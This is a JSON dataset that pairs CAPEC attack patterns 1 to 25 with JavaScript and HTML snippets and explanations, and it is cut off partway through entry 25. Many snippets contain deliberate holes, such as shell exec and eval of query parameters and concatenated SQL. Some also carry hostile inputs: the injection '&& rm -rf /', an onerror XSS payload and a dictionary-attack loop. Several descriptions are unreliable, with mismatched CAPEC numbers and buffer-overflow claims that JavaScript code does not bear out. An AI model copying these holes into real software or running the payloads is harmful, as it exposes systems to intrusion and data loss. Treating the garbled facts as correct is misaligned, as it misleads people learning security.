[
    {
        "capec_id": "1",
        "capec_name": "Accessing Functionality Not Properly Constrained by ACLs",
        "code_snippet": "const express = require('express');\nconst app = express();\n\n// Middleware to check if user is authenticated\nfunction isAuthenticated(req, res, next) {\n  if (req.user) {\n    next();\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n}\n\n// Route without proper ACL\napp.get('/admin', (req, res) => {\n  res.send('Welcome to the admin panel');\n});\n\n// Route with proper ACL\napp.get('/secure-admin', isAuthenticated, (req, res) => {\n  res.send('Welcome to the secure admin panel');\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web server. It demonstrates a common vulnerability where access to certain functionality is not properly constrained by Access Control Lists (ACLs). The '/admin' route is accessible without any authentication, representing a failure to specify an ACL, which can allow unauthorized users to access sensitive functionality. In contrast, the '/secure-admin' route uses a middleware function 'isAuthenticated' to check if the user is authenticated before granting access, representing a proper ACL implementation. This snippet embodies the main idea of CAPEC-1220 and related CWEs such as CWE-285 (Improper Authorization) and CWE-276 (Incorrect Default Permissions)."
    },
    {
        "capec_id": "2",
        "capec_name": "Inducing Account Lockout",
        "code_snippet": "const MAX_ATTEMPTS = 3;\nlet loginAttempts = {};\n\nfunction login(username, password) {\n  if (!loginAttempts[username]) {\n    loginAttempts[username] = 0;\n  }\n\n  if (loginAttempts[username] >= MAX_ATTEMPTS) {\n    console.log('Account locked due to too many failed attempts.');\n    return;\n  }\n\n  if (authenticate(username, password)) {\n    console.log('Login successful');\n    loginAttempts[username] = 0; // Reset on successful login\n  } else {\n    loginAttempts[username]++;\n    console.log('Login failed');\n  }\n}\n\nfunction authenticate(username, password) {\n  // Placeholder for actual authentication logic\n  return username === 'user' && password === 'password';\n}",
        "description": "This JavaScript code snippet demonstrates a simple login mechanism with an account lockout feature. The `login` function tracks the number of failed login attempts for each user and locks the account after a predefined number of failed attempts (MAX_ATTEMPTS). The `authenticate` function is a placeholder for actual authentication logic. This code embodies the CAPEC idea of 'Inducing Account Lockout' by showing how an attacker could exploit an overly restrictive account lockout mechanism (CWE-645) to deny service to legitimate users. The code also touches on the concept of improper restriction of excessive authentication attempts (CWE-307) by not implementing measures to prevent multiple failed attempts in a short time frame."
    },
    {
        "capec_id": "3",
        "capec_name": "Using Leading 'Ghost' Character Sequences to Bypass Input Filters",
        "code_snippet": "function validateInput(input) {\n  // Early validation before canonicalization\n  if (!/^[a-zA-Z0-9]+$/.test(input)) {\n    throw new Error('Invalid input');\n  }\n  // Canonicalization step\n  input = input.replace(/^\\u200B+/, ''); // Remove leading zero-width space characters\n  // Further processing\n  if (input === 'admin') {\n    console.log('Access granted');\n  } else {\n    console.log('Access denied');\n  }\n}\n\ntry {\n  validateInput('\\u200B\\u200Badmin'); // Ghost characters to bypass validation\n} catch (e) {\n  console.error(e.message);\n}",
        "description": "This JavaScript code snippet demonstrates a vulnerability where leading 'ghost' characters (zero-width space characters) are used to bypass input validation. The `validateInput` function first performs an early validation check to ensure the input contains only alphanumeric characters. However, this validation occurs before the input is canonicalized, allowing an attacker to prepend zero-width space characters to the input. These characters are then stripped during the canonicalization step, resulting in the input 'admin' passing through the validation and granting access. This example highlights the importance of proper input validation and canonicalization order to prevent such bypasses."
    },
    {
        "capec_id": "4",
        "capec_name": "Using Alternative IP Address Encodings",
        "code_snippet": "const http = require('http');\n\nconst allowedIPs = ['192.168.1.1', '192.168.1.2'];\n\nhttp.createServer((req, res) => {\n  const clientIP = req.connection.remoteAddress;\n  if (!allowedIPs.includes(clientIP)) {\n    res.writeHead(403, {'Content-Type': 'text/plain'});\n    res.end('Access Denied');\n    return;\n  }\n\n  // Process request\n  res.writeHead(200, {'Content-Type': 'text/plain'});\n  res.end('Hello, World!');\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates an HTTP server that restricts access based on the client's IP address. The server checks if the client's IP address is in the list of allowed IPs. If the IP address is not in the list, the server responds with 'Access Denied'. This code is vulnerable to the 'Using Alternative IP Address Encodings' attack (CAPEC-273) because it relies on a specific format of IP addresses for access control (CWE-291). An attacker could use alternative IP address encodings to bypass this check. Additionally, the code does not handle alternate encodings properly (CWE-173) and relies on the IP address for authentication without ensuring the IP address is truly associated with the client (CWE-350)."
    },
    {
        "capec_id": "5",
        "capec_name": "Blue Boxing",
        "code_snippet": "const net = require('net');\n\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    // CWE-940: Improper Verification of Source of a Communication Channel\n    if (data.toString().startsWith('SUPERVISOR_TONE')) {\n      // CWE-285: Improper Authorization\n      console.log('Supervisor command received, rerouting call...');\n      // Reroute or usurp command of the line\n      socket.write('Call rerouted');\n    } else {\n      console.log('Regular user command received');\n      socket.write('Command received');\n    }\n  });\n\n  // CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n  socket.on('end', () => {\n    console.log('Connection ended');\n  });\n});\n\nserver.listen(1337, '127.0.0.1');\nconsole.log('Server listening on port 1337');",
        "description": "This JavaScript code snippet creates a simple TCP server using the 'net' module. The server listens for incoming connections and processes data received from clients. The code demonstrates a vulnerability similar to the Blue Boxing attack by not properly verifying the source of a communication channel (CWE-940). If the data starts with 'SUPERVISOR_TONE', it assumes the command is from a supervisor and reroutes the call, representing improper authorization (CWE-285). Additionally, the server does not restrict communication channels to intended endpoints (CWE-923), allowing any client to connect and potentially exploit the system. This snippet embodies the main idea of the CAPEC by showing how a lack of proper authorization and verification can lead to unauthorized control over a communication system."
    },
    {
        "capec_id": "6",
        "capec_name": "Argument Injection",
        "code_snippet": "const http = require('http');\nconst { exec } = require('child_process');\n\nhttp.createServer((req, res) => {\n  const userInput = req.url.split('?cmd=')[1];\n  if (userInput) {\n    exec(userInput, (error, stdout, stderr) => {\n      if (error) {\n        res.writeHead(500, { 'Content-Type': 'text/plain' });\n        res.end('Server Error');\n        return;\n      }\n      res.writeHead(200, { 'Content-Type': 'text/plain' });\n      res.end(stdout);\n    });\n  } else {\n    res.writeHead(400, { 'Content-Type': 'text/plain' });\n    res.end('Bad Request');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that listens for incoming requests. It extracts a command from the URL query parameter 'cmd' and executes it using the 'exec' function from the 'child_process' module. The result of the command execution is then sent back to the client. This code is vulnerable to OS Command Injection (CWE-78) because it directly uses user input to construct and execute an OS command without proper validation or sanitization. This embodies the main idea of CAPEC-88 (Argument Injection), where an attacker can change the behavior of the application by injecting malicious data through non-validated arguments. The code also touches on other related CWEs, such as improper neutralization of special elements (CWE-74, CWE-146) and incomplete list of disallowed inputs (CWE-184)."
    },
    {
        "capec_id": "7",
        "capec_name": "Blind SQL Injection",
        "code_snippet": "const express = require('express');\nconst mysql = require('mysql');\nconst app = express();\nconst connection = mysql.createConnection({\n  host: 'localhost',\n  user: 'root',\n  password: '',\n  database: 'test'\n});\n\napp.get('/user', (req, res) => {\n  const userId = req.query.id;\n  const query = `SELECT * FROM users WHERE id = '${userId}'`;\n  connection.query(query, (error, results) => {\n    if (error) {\n      res.send('An error occurred');\n    } else {\n      res.json(results);\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a basic Express.js application that is vulnerable to Blind SQL Injection. The application connects to a MySQL database and retrieves user information based on a user-provided ID. The user input is directly included in the SQL query without proper sanitization or validation, making it susceptible to SQL Injection attacks. The error messages are suppressed, but an attacker can still exploit the vulnerability by crafting input that affects the SQL query's execution. This example embodies the main idea of CAPEC-111 (Blind SQL Injection) and highlights related CWEs such as CWE-89 (Improper Neutralization of Special Elements used in an SQL Command), CWE-20 (Improper Input Validation), and CWE-707 (Improper Neutralization)."
    },
    {
        "capec_id": "8",
        "capec_name": "Buffer Overflow in an API Call",
        "code_snippet": "const vulnerableLibrary = require('vulnerable-library');\n\nfunction processData(input) {\n  let buffer = Buffer.alloc(10); // Allocate a buffer of size 10\n  vulnerableLibrary.copyToBuffer(input, buffer); // Copy input to buffer without size check\n}\n\n// Example usage\nlet userInput = 'A'.repeat(20); // User input longer than buffer size\nprocessData(userInput);",
        "description": "This JavaScript code snippet demonstrates a buffer overflow vulnerability in an API call, as described in the CAPEC. The `vulnerableLibrary` is a hypothetical library that contains a function `copyToBuffer` which copies data to a buffer without checking the size of the input. The `processData` function allocates a buffer of size 10 and then calls `copyToBuffer` with user input. If the user input exceeds the buffer size, it leads to a buffer overflow. This snippet embodies CWE-120 (Buffer Copy without Checking Size of Input) and CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer). The example usage shows how an attacker can exploit this vulnerability by providing an input longer than the buffer size, causing a buffer overflow."
    },
    {
        "capec_id": "9",
        "capec_name": "Buffer Overflow in Local Command-Line Utilities",
        "code_snippet": "const exec = require('child_process').exec;\n\nfunction runCommand(userInput) {\n  const buffer = Buffer.alloc(10);\n  if (userInput.length > buffer.length) {\n    console.error('Input too long!');\n    return;\n  }\n  buffer.write(userInput);\n  exec(buffer.toString(), (error, stdout, stderr) => {\n    if (error) {\n      console.error(`exec error: ${error}`);\n      return;\n    }\n    console.log(`stdout: ${stdout}`);\n    console.error(`stderr: ${stderr}`);\n  });\n}\n\n// Example usage\nrunCommand('ls -la');",
        "description": "This JavaScript code snippet demonstrates a vulnerable command-line utility function that can be exploited for a buffer overflow attack. The function `runCommand` takes user input, checks if the input length exceeds the buffer size, and writes the input to the buffer. If the input length is greater than the buffer size, it logs an error and returns. However, the buffer is then used to execute a shell command using `exec`. This code is vulnerable to CWE-120 (Buffer Copy without Checking Size of Input) and CWE-20 (Improper Input Validation) because it does not properly handle the input size and directly uses the buffer content to execute a command, potentially leading to a buffer overflow and command injection attack. The code represents the main idea of CAPEC-100 (Buffer Overflow in Local Command-Line Utilities) by showing how improper handling of input in command-line utilities can lead to privilege escalation."
    },
    {
        "capec_id": "10",
        "capec_name": "Buffer Overflow via Environment Variables",
        "code_snippet": "const exec = require('child_process').exec;\n\nfunction runCommand() {\n  const envVar = process.env.USER_INPUT;\n  const buffer = Buffer.alloc(50);\n  buffer.write(envVar, 'utf-8');\n  exec(buffer.toString(), (error, stdout, stderr) => {\n    if (error) {\n      console.error(`exec error: ${error}`);\n      return;\n    }\n    console.log(`stdout: ${stdout}`);\n    console.error(`stderr: ${stderr}`);\n  });\n}\n\nrunCommand();",
        "description": "This JavaScript code snippet demonstrates a buffer overflow vulnerability via environment variables. The function `runCommand` reads an environment variable `USER_INPUT` and writes it to a buffer of fixed size (50 bytes) without checking the length of the input. This can lead to a buffer overflow if the environment variable exceeds the buffer size. The buffer content is then executed as a command, which can lead to arbitrary code execution. This snippet embodies the main idea of CAPEC-14 (Buffer Overflow via Environment Variables) and highlights related CWEs such as CWE-120 (Buffer Copy without Checking Size of Input) and CWE-20 (Improper Input Validation)."
    },
    {
        "capec_id": "11",
        "capec_name": "Cause Web Server Misclassification",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\nconst path = require('path');\n\nhttp.createServer((req, res) => {\n  let filePath = '.' + req.url;\n  const extname = String(path.extname(filePath)).toLowerCase();\n  const mimeTypes = {\n    '.html': 'text/html',\n    '.js': 'text/javascript',\n    '.css': 'text/css',\n    '.json': 'application/json',\n    '.png': 'image/png',\n    '.jpg': 'image/jpg',\n    '.gif': 'image/gif',\n    '.wav': 'audio/wav',\n    '.mp4': 'video/mp4',\n    '.woff': 'application/font-woff',\n    '.ttf': 'application/font-ttf',\n    '.eot': 'application/vnd.ms-fontobject',\n    '.otf': 'application/font-otf',\n    '.wasm': 'application/wasm'\n  };\n\n  const contentType = mimeTypes[extname] || 'application/octet-stream';\n\n  fs.readFile(filePath, (error, content) => {\n    if (error) {\n      if (error.code == 'ENOENT') {\n        fs.readFile('./404.html', (error, content) => {\n          res.writeHead(404, { 'Content-Type': 'text/html' });\n          res.end(content, 'utf-8');\n        });\n      } else {\n        res.writeHead(500);\n        res.end('Sorry, check with the site admin for error: ' + error.code + ' ..\\n');\n        res.end();\n      }\n    } else {\n      res.writeHead(200, { 'Content-Type': contentType });\n      res.end(content, 'utf-8');\n    }\n  });\n}).listen(8125);\n\nconsole.log('Server running at http://127.0.0.1:8125/');",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server reads files from the file system based on the URL requested by the client. The file extension is used to determine the MIME type for the response. This code is vulnerable to the 'Cause Web Server Misclassification' attack described in the CAPEC. Specifically, it relies on the file extension to determine the content type (CWE-646), and it does not properly restrict the file names (CWE-641). An attacker could exploit this by requesting files with unexpected extensions or names, potentially causing the server to misclassify the file type and take unintended actions, such as serving raw content or executing unintended scripts."
    },
    {
        "capec_id": "12",
        "capec_name": "Choosing Message Identifier",
        "code_snippet": "const multicastChannel = new MulticastChannel();\n\nfunction sendMessage(clientId, message) {\n  const messageId = generateMessageId(clientId);\n  const payload = { id: messageId, data: message };\n  multicastChannel.send(payload);\n}\n\nfunction receiveMessage(payload) {\n  const { id, data } = payload;\n  if (isValidMessageId(id)) {\n    processMessage(data);\n  } else {\n    console.error('Invalid message identifier');\n  }\n}\n\nfunction generateMessageId(clientId) {\n  // CWE-1292: Incorrect Conversion of Security Identifiers\n  return 'client-' + clientId;\n}\n\nfunction isValidMessageId(id) {\n  // CWE-1290: Incorrect Decoding of Security Identifiers\n  return id.startsWith('client-');\n}\n\nfunction processMessage(message) {\n  // Process the message\n  console.log('Processing message:', message);\n}\n\n// Example usage\nsendMessage(123, 'Sensitive data');\nmulticastChannel.on('message', receiveMessage);",
        "description": "This JavaScript code snippet demonstrates a multicast communication system where messages are sent and received based on client identifiers. The `sendMessage` function generates a message identifier using the client ID and sends the message via a multicast channel. The `receiveMessage` function validates the message identifier before processing the message. The code highlights potential vulnerabilities such as CWE-1292 (Incorrect Conversion of Security Identifiers) and CWE-1290 (Incorrect Decoding of Security Identifiers), which could allow an attacker to manipulate message identifiers to gain unauthorized access to messages intended for other clients. This embodies the main idea of the CAPEC by showing how improper handling of message identifiers can lead to security breaches."
    },
    {
        "capec_id": "13",
        "capec_name": "Subverting Environment Variable Values",
        "code_snippet": "const fs = require('fs');\nconst exec = require('child_process').exec;\n\n// Vulnerable to CWE-15: External Control of System or Configuration Setting\nprocess.env['CONFIG_PATH'] = '/etc/config';\n\n// Vulnerable to CWE-73: External Control of File Name or Path\nconst configPath = process.env['CONFIG_PATH'];\n\n// Vulnerable to CWE-20: Improper Input Validation\nif (configPath) {\n  // Vulnerable to CWE-74: Injection\n  exec(`cat ${configPath}`, (error, stdout, stderr) => {\n    if (error) {\n      console.error(`Error: ${error}`);\n      return;\n    }\n    console.log(`Config: ${stdout}`);\n  });\n}\n\n// Vulnerable to CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\nfs.readFile(configPath, 'utf8', (err, data) => {\n  if (err) {\n    console.error(`Error reading file: ${err}`);\n    return;\n  }\n  console.log(`Config content: ${data}`);\n});",
        "description": "This JavaScript code snippet demonstrates a scenario where an adversary can subvert environment variable values to manipulate the behavior of the target software. The code sets an environment variable 'CONFIG_PATH' to a potentially unsafe value, which is then used to read a configuration file. The code is vulnerable to several CWEs:\n\n1. CWE-15: External Control of System or Configuration Setting - The environment variable 'CONFIG_PATH' is set externally and can be manipulated by an attacker.\n2. CWE-73: External Control of File Name or Path - The 'configPath' variable is derived from an environment variable, allowing an attacker to control the file path.\n3. CWE-20: Improper Input Validation - The code does not validate the 'configPath' value before using it.\n4. CWE-74: Injection - The 'exec' function uses the 'configPath' directly in a command, making it susceptible to command injection.\n5. CWE-200: Exposure of Sensitive Information to an Unauthorized Actor - The content of the configuration file is printed to the console, potentially exposing sensitive information.\n\nThe main idea represented here is the subversion of environment variables to alter the behavior of the software in a way that benefits the adversary, leading to various security vulnerabilities."
    },
    {
        "capec_id": "14",
        "capec_name": "Client-side Injection-induced Buffer Overflow",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  let buffer = Buffer.alloc(10);\n\n  // CWE-20: Improper Input Validation\n  if (queryObject.input) {\n    // CWE-120: Buffer Copy without Checking Size of Input\n    buffer.write(queryObject.input);\n  }\n\n  res.writeHead(200, {'Content-Type': 'text/html'});\n  res.end('<html><body>Buffer content: ' + buffer.toString() + '</body></html>');\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates an HTTP server that listens on port 8080. It parses the URL query parameters and writes the 'input' parameter to a buffer of fixed size (10 bytes) without checking the size of the input. This demonstrates a classic buffer overflow vulnerability (CWE-120) due to improper input validation (CWE-20). An attacker could exploit this by sending a specially crafted request with a long 'input' parameter, causing a buffer overflow. The code represents the main idea of CAPEC-Client-side Injection-induced Buffer Overflow by showing how a client-side application (in this case, a server) can be exploited through injection of malicious content."
    },
    {
        "capec_id": "15",
        "capec_name": "Command Delimiters",
        "code_snippet": "const exec = require('child_process').exec;\n\nfunction executeCommand(userInput) {\n  // Vulnerable to command injection due to improper neutralization of special elements\n  const command = `ls ${userInput}`;\n  exec(command, (error, stdout, stderr) => {\n    if (error) {\n      console.error(`Error: ${error.message}`);\n      return;\n    }\n    if (stderr) {\n      console.error(`Stderr: ${stderr}`);\n      return;\n    }\n    console.log(`Stdout: ${stdout}`);\n  });\n}\n\n// Example usage\nexecuteCommand('&& rm -rf /');",
        "description": "This JavaScript code snippet demonstrates a command injection vulnerability. The `executeCommand` function takes user input and concatenates it directly into a shell command without proper neutralization of special elements. This allows an attacker to inject arbitrary commands by using command delimiters (e.g., `&&`). In the example usage, the input `&& rm -rf /` would cause the system to execute a destructive command, illustrating the risk of improper input handling. This snippet embodies the main idea of CAPEC-88 (Command Delimiters) and related CWEs, such as CWE-77 (Command Injection) and CWE-78 (OS Command Injection)."
    },
    {
        "capec_id": "16",
        "capec_name": "Dictionary-based Password Attack",
        "code_snippet": "const users = { 'user1': 'password123', 'user2': 'qwerty', 'user3': 'letmein' }; // CWE-521: Weak Password Requirements\n\nfunction authenticate(username, password) {\n  if (users[username] && users[username] === password) {\n    return 'Access granted';\n  } else {\n    return 'Access denied';\n  }\n}\n\n// CWE-307: Improper Restriction of Excessive Authentication Attempts\nfunction dictionaryAttack(username, dictionary) {\n  for (let i = 0; i < dictionary.length; i++) {\n    if (authenticate(username, dictionary[i]) === 'Access granted') {\n      console.log(`Password found: ${dictionary[i]}`);\n      return;\n    }\n  }\n  console.log('Password not found');\n}\n\nconst dictionary = ['123456', 'password', '123456789', 'password123', 'qwerty', 'abc123', 'letmein'];\ndictionaryAttack('user1', dictionary);",
        "description": "This JavaScript code snippet demonstrates a dictionary-based password attack (CAPEC-16). The 'users' object contains weak passwords (CWE-521). The 'authenticate' function checks if the provided username and password match. The 'dictionaryAttack' function attempts to authenticate a user by iterating through a list of common passwords (dictionary). If a password matches, it logs the found password. This code highlights the vulnerability of systems with weak password requirements and insufficient measures to prevent multiple failed authentication attempts (CWE-307)."
    },
    {
        "capec_id": "17",
        "capec_name": "Using Malicious Files",
        "code_snippet": "const express = require('express');\nconst fileUpload = require('express-fileupload');\nconst fs = require('fs');\nconst app = express();\n\napp.use(fileUpload());\n\napp.post('/upload', (req, res) => {\n  if (!req.files || Object.keys(req.files).length === 0) {\n    return res.status(400).send('No files were uploaded.');\n  }\n\n  let uploadedFile = req.files.uploadedFile;\n  let uploadPath = __dirname + '/uploads/' + uploadedFile.name;\n\n  // Incorrect Permission Assignment for Critical Resource (CWE-732)\n  fs.writeFileSync(uploadPath, uploadedFile.data, { mode: 0o777 });\n\n  // Improper Authorization (CWE-285)\n  // No authorization check to ensure the user has permission to upload files\n\n  // Least Privilege Violation (CWE-272)\n  // The server runs with elevated privileges and does not drop them after file operations\n\n  // Improper Link Resolution Before File Access (CWE-59)\n  // No checks to prevent symbolic link attacks\n\n  // Improper Ownership Management (CWE-282)\n  // No verification of file ownership after upload\n\n  // Privilege Context Switching Error (CWE-270)\n  // No proper management of privileges during file handling\n\n  // Protection Mechanism Failure (CWE-693)\n  // No additional protection mechanisms like file type validation\n\n  uploadedFile.mv(uploadPath, (err) => {\n    if (err) return res.status(500).send(err);\n    res.send('File uploaded!');\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server started on http://localhost:3000');\n});",
        "description": "This JavaScript code snippet represents a vulnerable file upload functionality using the Express framework and the express-fileupload middleware. The code allows users to upload files to the server without proper security checks, embodying the main idea of the CAPEC 'Using Malicious Files'. The code demonstrates several related CWEs:\n\n1. **CWE-732 (Incorrect Permission Assignment for Critical Resource)**: The uploaded file is saved with overly permissive permissions (mode 0o777), allowing any user to read, write, or execute the file.\n2. **CWE-285 (Improper Authorization)**: There is no authorization check to ensure that the user has permission to upload files.\n3. **CWE-272 (Least Privilege Violation)**: The server runs with elevated privileges and does not drop them after performing file operations.\n4. **CWE-59 (Improper Link Resolution Before File Access)**: The code does not check for symbolic link attacks, which could allow an attacker to overwrite or access unintended files.\n5. **CWE-282 (Improper Ownership Management)**: The code does not verify the ownership of the file after it is uploaded.\n6. **CWE-270 (Privilege Context Switching Error)**: The code does not properly manage privileges during file handling.\n7. **CWE-693 (Protection Mechanism Failure)**: The code lacks additional protection mechanisms, such as file type validation, to defend against malicious file uploads.\n\nThis example highlights the importance of implementing proper security measures when handling file uploads to prevent potential vulnerabilities and attacks."
    },
    {
        "capec_id": "18",
        "capec_name": "XSS Targeting Non-Script Elements",
        "code_snippet": "<html>\n<body>\n  <img src=\"x\" onerror=\"alert('XSS Attack!')\">\n  <!-- < !-CDATA-<script>alert('XSS in CDATA')</script> -->\n</body>\n</html>",
        "description": "This HTML snippet demonstrates an XSS attack targeting non-script elements. The <img> tag includes an 'onerror' attribute that executes JavaScript when the image fails to load, which is a common XSS vector (CWE-82). Additionally, a commented-out CDATA section contains a script tag, illustrating how XSS can be embedded in unexpected places like XML comments (CWE-80). This code highlights the importance of proper input and output validation to prevent XSS attacks (CWE-79, CWE-692, CWE-81)."
    },
    {
        "capec_id": "19",
        "capec_name": "Embedding Scripts within Scripts",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  if (queryObject.script) {\n    try {\n      eval(queryObject.script); // CWE-284, CWE-79, CWE-506\n    } catch (e) {\n      res.writeHead(500, {'Content-Type': 'text/plain'});\n      res.end('Error executing script');\n      return;\n    }\n  }\n  res.writeHead(200, {'Content-Type': 'text/plain'});\n  res.end('Script executed');\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates an HTTP server that listens for incoming requests. It parses the URL query parameters and checks if a 'script' parameter is present. If so, it attempts to execute the script using the 'eval' function. This embodies the CAPEC 'Embedding Scripts within Scripts' by allowing an adversary to embed and execute their own script within the server's context. The use of 'eval' here is particularly dangerous and represents CWE-284 (Improper Access Control), CWE-79 (Cross-site Scripting), and CWE-506 (Embedded Malicious Code). The server does not properly restrict access to the 'eval' function, does not neutralize the input, and allows potentially malicious code to be executed, demonstrating the vulnerabilities described."
    },
    {
        "capec_id": "20",
        "capec_name": "Encryption Brute Forcing",
        "code_snippet": "const crypto = require('crypto');\n\nconst algorithm = 'aes-256-cbc';\nconst key = '12345678901234567890123456789012'; // CWE-321: Hard-coded cryptographic key\nconst iv = Buffer.alloc(16, 0); // CWE-1204: Weak Initialization Vector\n\nconst encrypt = (text) => {\n  const cipher = crypto.createCipheriv(algorithm, Buffer.from(key), iv);\n  let encrypted = cipher.update(text);\n  encrypted = Buffer.concat([encrypted, cipher.final()]);\n  return encrypted.toString('hex');\n};\n\nconst decrypt = (encryptedText) => {\n  const encryptedTextBuffer = Buffer.from(encryptedText, 'hex');\n  const decipher = crypto.createDecipheriv(algorithm, Buffer.from(key), iv);\n  let decrypted = decipher.update(encryptedTextBuffer);\n  decrypted = Buffer.concat([decrypted, decipher.final()]);\n  return decrypted.toString();\n};\n\nconst plaintext = 'Sensitive Data';\nconst encryptedText = encrypt(plaintext);\nconsole.log('Encrypted:', encryptedText);\nconsole.log('Decrypted:', decrypt(encryptedText));",
        "description": "This JavaScript code snippet demonstrates a vulnerable encryption implementation. It uses the AES-256-CBC algorithm with a hard-coded cryptographic key (CWE-321) and a weak initialization vector (IV) (CWE-1204). The encrypt function takes plaintext and returns its encrypted form, while the decrypt function reverses the process. The use of a hard-coded key and a predictable IV makes the encryption susceptible to brute force attacks (CAPEC-116), as an attacker can easily guess the key and IV to decrypt the ciphertext."
    },
    {
        "capec_id": "21",
        "capec_name": "Exploitation of Trusted Identifiers",
        "code_snippet": "const express = require('express');\nconst cookieParser = require('cookie-parser');\nconst app = express();\napp.use(cookieParser());\n\napp.get('/login', (req, res) => {\n  const userId = req.query.userId;\n  // CWE-642: Storing critical state data in a cookie\n  res.cookie('sessionId', userId, { httpOnly: false, secure: false });\n  res.send('Logged in');\n});\n\napp.get('/dashboard', (req, res) => {\n  const sessionId = req.cookies.sessionId;\n  // CWE-346: No proper origin validation\n  if (sessionId) {\n    res.send(`Welcome user ${sessionId}`);\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a simple Express.js application that is vulnerable to the exploitation of trusted identifiers. The '/login' endpoint sets a session ID in a cookie without proper security measures (CWE-642). The '/dashboard' endpoint retrieves the session ID from the cookie without validating its origin (CWE-346). This setup allows an attacker to guess or obtain a valid session ID and perform actions as an authenticated user, embodying the main idea of CAPEC-111: Exploitation of Trusted Identifiers."
    },
    {
        "capec_id": "22",
        "capec_name": "Exploiting Trust in Client",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst port = 3000;\n\n// Mock user data\nconst users = {\n  'user1': { password: 'password123', secret: 'Sensitive Data' }\n};\n\n// Vulnerable authentication endpoint\napp.post('/login', (req, res) => {\n  const username = req.query.username;\n  const password = req.query.password;\n\n  // CWE-287: Improper Authentication\n  if (users[username] && users[username].password === password) {\n    // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n    res.send(`Welcome ${username}, here is your secret: ${users[username].secret}`);\n  } else {\n    res.status(401).send('Authentication failed');\n  }\n});\n\napp.listen(port, () => {\n  console.log(`Server running on http://localhost:${port}`);\n});",
        "description": "This JavaScript code snippet sets up an Express server with a vulnerable authentication endpoint. The endpoint checks the username and password provided in the query parameters without proper input validation (CWE-20). If the credentials match, it exposes sensitive information (CWE-200) to the client. The authentication mechanism is weak and can be easily bypassed (CWE-287), representing the main idea of 'Exploiting Trust in Client' by allowing an attacker to spoof a legitimate client and gain unauthorized access to sensitive data."
    },
    {
        "capec_id": "23",
        "capec_name": "File Content Injection",
        "code_snippet": "const express = require('express');\nconst fileUpload = require('express-fileupload');\nconst fs = require('fs');\nconst path = require('path');\n\nconst app = express();\napp.use(fileUpload());\n\napp.post('/upload', (req, res) => {\n  if (!req.files || Object.keys(req.files).length === 0) {\n    return res.status(400).send('No files were uploaded.');\n  }\n\n  let uploadedFile = req.files.file;\n  let uploadPath = path.join(__dirname, 'uploads', uploadedFile.name);\n\n  // Save the file without validating its type or content\n  uploadedFile.mv(uploadPath, (err) => {\n    if (err) return res.status(500).send(err);\n    res.send('File uploaded!');\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server started on http://localhost:3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework and the express-fileupload middleware to create a simple file upload server. The server accepts file uploads via a POST request to the '/upload' endpoint. The uploaded file is saved to the 'uploads' directory without any validation of its type or content. This lack of validation and reliance on the file name or extension (CWE-646) makes the server vulnerable to file content injection attacks (CAPEC-20). An attacker could upload a malicious file, which could then be executed or processed by the server, leading to potential security breaches. The code also demonstrates CWE-434 (Unrestricted Upload of File with Dangerous Type) and CWE-20 (Improper Input Validation) by not checking the file type or content before saving it."
    },
    {
        "capec_id": "24",
        "capec_name": "Filter Failure through Buffer Overflow",
        "code_snippet": "function processInput(input) {\n  var buffer = new Array(10);\n  for (var i = 0; i < input.length; i++) {\n    buffer[i] = input[i];\n  }\n  // Simulate filter processing\n  if (buffer.includes('<script>')) {\n    console.log('Malicious input detected!');\n  } else {\n    console.log('Input processed: ' + buffer.join(''));\n  }\n}\n\n// Example of an oversized input causing buffer overflow\nvar userInput = 'A'.repeat(20) + '<script>alert(1)</script>';\nprocessInput(userInput);",
        "description": "This JavaScript code snippet demonstrates a filter failure through a buffer overflow. The `processInput` function takes an input string and attempts to copy it into a fixed-size buffer of 10 elements. If the input exceeds the buffer size, it causes a buffer overflow, potentially allowing malicious input to bypass the filter. The filter checks for the presence of the '<script>' tag to detect malicious input, but due to the buffer overflow, the filter may fail to function correctly. This example embodies the CAPEC idea by showing how an oversized input can overwhelm a filter, leading to potential security vulnerabilities. The related CWEs are represented by the buffer overflow (CWE-120), improper restriction of memory operations (CWE-119), and improper input validation (CWE-20)."
    },
    {
        "capec_id": "25",
        "capec_name": "Forced Deadlock",
